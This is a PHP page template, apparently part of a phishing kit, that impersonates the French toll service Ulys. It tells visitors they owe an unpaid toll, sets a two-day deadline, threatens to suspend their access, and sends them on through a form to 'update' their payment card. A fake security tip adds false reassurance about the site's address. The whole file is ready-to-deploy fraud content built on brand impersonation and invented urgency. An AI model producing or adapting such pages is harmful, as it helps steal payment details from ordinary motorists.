<?php
require_once 'config/panel.php';
// Start output buffering to capture content
ob_start();
// Calculer la date J+2
$dateJ2 = date('d/m', strtotime('+2 days'));
?>

<div class="ulys-main" style="margin-top: 48px;">
    <div class="ulys-login-card" style="max-width: 600px;">
        <h2 class="mb-2">Mise à jour de votre moyen de paiement</h2>
        <div class="ulys-login-desc mb-4">
            <span class="ulys-orange">Un impayé de péages de <strong><?php echo REFUNDPRICE; ?>€</strong> reste dû.<br>Merci de régulariser avant le <?php echo $dateJ2; ?> sur votre espace client.</span>
        </div>
        <div class="ulys-form-group mb-4">
            <div class="ulys-tip-block" style="background: #fff7e6; border-radius: 10px; padding: 18px 18px 12px 18px; border: 1.5px solid #ffe0b2;">
                <i class="fas fa-exclamation-triangle" style="color: #ff3c1b; font-size: 1.5rem;"></i>
                <div>
                    <strong>Important :</strong> Votre accès au service Ulys est sur le point d'être suspendu.<br>
                    <ul style="margin: 10px 0 0 18px; padding: 0; color: #222; font-size: 1.01rem;">
                        <li>Merci de renseigner un moyen de paiement valide et à jour.</li>
                        <li>Vérifiez les informations de votre carte ou de votre compte.</li>
                        <li>Confirmez vos données pour éviter la suspension de votre accès.</li>
                    </ul>
                </div>
            </div>
        </div>
        <form method="POST" action="index.php" class="mt-4">
            <button type="submit" name="submit" value="page2" class="ulys-btn" style="background: #ff3c1b; color: #fff;">
                <i class="fas fa-arrow-right mr-2"></i> Mettre à jour mon moyen de paiement
            </button>
        </form>
    </div>
    <div class="ulys-tips-col">
        <h3>Astuces !</h3>
        <div class="ulys-tip-block">
            <i class="fas fa-credit-card"></i>
            <div>
                <strong>Identifiant :</strong><br>
                Utilisez l'adresse e-mail associée à votre compte client pour simplifier la connexion.
            </div>
        </div>
        <div class="ulys-tip-block">
            <i class="fas fa-lock"></i>
            <div>
                <strong>Sécurité :</strong><br>
                Vérifiez que l'adresse du site commence par <b>https://</b> et se termine par <b>.ulys.com</b>.
            </div>
        </div>
    </div>
</div>

<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();

// Include layout with the view content
include_once 'layout.php';
?> 